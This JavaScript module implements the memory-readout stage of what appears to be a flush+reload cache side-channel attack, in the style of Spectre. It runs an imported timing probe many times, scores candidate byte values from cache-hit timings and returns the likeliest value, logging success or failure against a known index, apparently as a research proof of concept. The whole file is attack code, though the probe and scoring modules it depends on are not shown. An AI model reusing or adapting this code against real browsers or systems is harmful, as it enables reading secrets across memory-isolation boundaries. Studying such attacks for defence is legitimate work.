import {mean, zIndex} from "./math.js";
import flushReloadProbe_promise from "./flush-reload-probe.js";
import indicator_table_promise from "./indicator-table.js";

export default (async () => {
    const {
        indicator_table,
        reset,
        processTimetable,
        analyseTimetable
    } = await indicator_table_promise;
    const flushReloadProbe = await flushReloadProbe_promise;
    return function readMemory(iteration_limit, probe_index, cache_hit_weight = .5) {
        reset();
        let max_indicator;
        let max_indicator_index;
        let i = 0;
        for (let j = 0; i < iteration_limit && j < iteration_limit * 10; ++j) {
            // await new Promise(resolve => setTimeout(resolve, 0));
            const time_table = flushReloadProbe(probe_index);
            try {
                processTimetable(time_table, cache_hit_weight);
            } catch (error) {
                if (error.message == "timer fault") {
                    // console.warn("timer fault");
                } else {
                    console.error(error);
                }
            }
            max_indicator = Math.max(...indicator_table);
            let current_max_indicator_index = indicator_table.indexOf(max_indicator);
            // check for multiple maxima
            for (let i = current_max_indicator_index + 1; i < indicator_table.length; ++i) {
                if (max_indicator == indicator_table[i]) {
                    current_max_indicator_index = undefined;
                    break;
                }
            }
            // max_indicator_index changed
            if (max_indicator_index != current_max_indicator_index) {
                i = (current_max_indicator_index !== undefined) | 0;
                max_indicator_index = current_max_indicator_index;
                // console.warn("max_indicator_index changed");
            } else {
                ++i;
            }
            
            /*let second_indicator = -Infinity;
            for (let i = 0; i < indicator_table.length; ++i) {
                const indicator = indicator_table[i];
                if (indicator > second_indicator && i != max_indicator_index) {
                    second_indicator = indicator;
                }
            }
            const second_ratio = second_indicator / max_indicator;*/
            storage[probe_index] = {
                max_indicator_index,
                max_indicator: max_indicator / (j+1),
                // second_ratio,
                time_table: [...time_table]
            };
            
            // analyse using secret information
            // analyseTimetable(time_table, cache_hit_weight, probe_index);
        }
        let second_indicator = -Infinity;
        for (let i = 0; i < indicator_table.length; ++i) {
            const indicator = indicator_table[i];
            if (indicator > second_indicator && i != max_indicator_index) {
                second_indicator = indicator;
            }
        }
        const second_ratio = second_indicator / max_indicator;
        // console.log("second indicator ratio", second_ratio);
        // console.log("indicator table", indicator_table);
        // console.log("took", j, "steps");
        try {
            return {
                result: max_indicator_index,
                second_ratio
            };
        } finally {
            if (max_indicator_index == probe_index) {
                console.log("success for", probe_index);
            } else {
                console.log("failure", max_indicator_index, "for", probe_index);
            }   
        }
    };
})();